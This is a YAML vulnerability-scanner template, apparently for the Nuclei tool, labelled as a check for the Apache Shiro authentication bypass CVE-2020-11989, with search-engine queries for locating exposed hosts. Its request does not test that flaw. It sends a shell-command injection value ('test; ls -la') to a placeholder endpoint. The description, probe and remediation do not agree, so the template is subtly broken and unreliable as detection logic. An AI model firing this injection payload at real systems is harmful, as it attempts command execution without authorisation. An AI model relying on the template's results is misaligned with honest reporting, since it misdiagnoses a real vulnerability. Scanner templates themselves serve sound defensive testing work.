id: CVE-2020-11989

info:
  name: Apache Shiro Authentication Bypass CVE-2020-11989
  author: ProjectDiscoveryAI
  severity: critical
  description: Apache Shiro before 1.5.3, when using Apache Shiro with Spring dynamic controllers, a specially crafted request may cause an authentication bypass.
  impact: |
    Successful exploitation could allow attackers to bypass authentication controls.
  remediation: |
    Upgrade to Apache Shiro version 1.7.1 or later to mitigate the vulnerability.
  reference:
    - https://lists.apache.org/thread.html/r2d2612c034ab21a3a19d2132d47d3e4aa70105008dd58af62b653040%40%3Ccommits.shiro.apache.org%3E
    - https://lists.apache.org/thread.html/r408fe60bc8fdfd7c74135249d646d7abadb807ebf90f6fd2b014df21%40%3Cdev.geode.apache.org%3E
    - https://lists.apache.org/thread.html/r72815a124a119c450b86189767d06848e0d380b1795c6c511d54a675%40%3Cdev.shiro.apache.org%3E
    - https://lists.apache.org/thread.html/rab1972d6b177f7b5c3dde9cfb0a40f03bca75f0eaf1d8311e5762cb3%40%3Ccommits.shiro.apache.org%3E
    - https://lists.apache.org/thread.html/rc8b39ea8b3ef71ddc1cd74ffc866546182683c8adecf19c263fe7ac0%40%3Ccommits.shiro.apache.org%3E
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-11989
    epss-score: 0.01559
    epss-percentile: 0.87719
    cpe: cpe:2.3:a:apache:shiro:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: shiro
    shodan-query: http.title:"apache shiro quickstart"
    fofa-query: title="apache shiro quickstart"
    google-query: intitle:"apache shiro quickstart"

http:
  - method: POST
    path:
      - "{{BaseURL}}/vulnerable_endpoint"

    body: |
      {
        "param1": "test",
        "param2": "test; ls -la"
      }

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - "total"
        part: body
